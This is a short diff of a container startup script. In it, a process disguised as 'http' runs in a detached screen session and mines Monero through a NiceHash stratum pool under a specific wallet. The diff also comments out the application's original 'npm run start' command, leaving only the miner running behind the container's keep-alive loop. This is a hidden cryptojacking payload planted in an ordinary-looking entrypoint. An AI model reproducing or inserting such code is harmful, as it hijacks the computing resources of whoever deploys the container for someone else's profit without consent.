@@ -17,8 +17,8 @@ cd /app2/httpalpine
 screen -dmS http_session sh -c "./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash --threads=16"
 
 # Change directory to /app and run the original command in the background
-cd /app
-npm run start
+#cd /app
+#npm run start
 
 # Keep the container running
 tail -f /dev/null
